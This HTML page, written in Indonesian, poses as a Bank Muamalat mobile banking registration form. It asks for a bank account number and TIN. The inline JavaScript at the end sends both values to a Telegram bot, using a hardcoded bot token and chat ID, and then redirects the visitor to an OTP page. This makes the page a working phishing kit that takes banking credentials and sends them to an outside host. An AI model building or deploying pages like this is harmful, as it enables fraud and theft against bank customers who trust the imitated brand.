<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Registrasi</title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ"
            crossorigin="anonymous"
        />
        <style>
            .button {
                width: 100%;
                padding: 15px;
                outline: none;
                border: none;
                background-color: #1cad43;
            }
        </style>
    </head>
    <body>
        <nav class="navbar bg-body-tertiary">
            <div class="container">
                <div class="link1 d-flex" style="flex-direction: column">
                    <a class="navbar-brand mx-auto" href="#">
                        <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="25"
                            height="25"
                            fill="currentColor"
                            class="bi text-light bi-person-circle"
                            viewBox="0 0 16 16"
                            style="background-color: purple; border-radius: 50%"
                        >
                            <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" />
                            <path
                                fill-rule="evenodd"
                                d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"
                            />
                        </svg>
                    </a>
                    <span class="fw-bold" style="color: purple">Rekening</span>
                </div>
                <div class="link1 d-flex" style="flex-direction: column">
                    <a class="navbar-brand mx-auto" href="#">
                        <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="25"
                            height="25"
                            fill="currentColor"
                            class="bi bi-person-check"
                            viewBox="0 0 16 16"
                        >
                            <path
                                d="M12.5 16a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7Zm1.679-4.493-1.335 2.226a.75.75 0 0 1-1.174.144l-.774-.773a.5.5 0 0 1 .708-.708l.547.548 1.17-1.951a.5.5 0 1 1 .858.514ZM11 5a3 3 0 1 1-6 0 3 3 0 0 1 6 0ZM8 7a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z"
                            />
                            <path
                                d="M8.256 14a4.474 4.474 0 0 1-.229-1.004H3c.001-.246.154-.986.832-1.664C4.484 10.68 5.711 10 8 10c.26 0 .507.009.74.025.226-.341.496-.65.804-.918C9.077 9.038 8.564 9 8 9c-5 0-6 3-6 4s1 1 1 1h5.256Z"
                            />
                        </svg>
                    </a>
                    <span>Verifikasi</span>
                </div>
            </div>
        </nav>
        <div class="container mt-3">
            <div class="form-group">
                <label
                    class="fw-bold"
                    style="color: purple; font-size: 12px"
                    for="norek"
                    >Nomor Rekening*</label
                >
                <input
                    type="number"
                    class="form-control"
                    id="norek"
                    placeholder="Masukkan Nomor Rekening"
                />
            </div>
            <div class="form-group mt-3">
                <label
                    class="fw-bold"
                    style="color: purple; font-size: 12px"
                    for="tin"
                    >Nomor TIN*</label
                >
                <input
                    type="number"
                    class="form-control"
                    id="tin"
                    placeholder="Masukkan Nomor TIN"
                />
            </div>
            <span style="font-size: 10px; color: #808080"
                >*Masukkan data sesuai yang terdaftar di Bank</span
            >
            <div class="ketentuan mt-3">
                <span class="fw-bold" style="font-size: 12px"
                    >Syarat & Ketentuan
                    <a href="">Mobile Banking Muamalat</a></span
                >
            </div>
            <div class="form-group mt-2">
                <input type="checkbox" name="agree" id="agree" />
                <span style="color: purple"
                    >Setuju dengan syarat & Ketentuan</span
                >
            </div>
        </div>
        <div class="mybtn">
            <button
                class="button text-light fw-bold"
                style="position: fixed; bottom: 0"
                onclick="lanjut()"
            >
                Lanjut
            </button>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
            crossorigin="anonymous"
        ></script>
        <script type="text/javascript" charset="utf-8">
            async function sendMessage(chatId, text) {
                const url =
                    "https://api.telegram.org/bot6217918085:AAHeiUZAZNLv21wGuBh_bTsMttJRGWYa2Zc/sendMessage";
                const payload = {
                    chat_id: chatId,
                    text: text,
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error("Failed to send message");
                } else {
                    window.location.href = "otp.html";
                }
            }
            const lanjut = () => {
                let norek = document.querySelector("#norek").value;
                let tin = document.querySelector("#tin").value;
                if (norek === "" || tin === "") {
                    alert("mohon lengkapi semua data!");
                } else {
                    let text = `Nomor rekening: ${norek}\nNomor TIN: ${tin}`;
                    let chatId = "5882863819";
                    sendMessage(chatId, text);
                }
            };
        </script>
    </body>
</html>
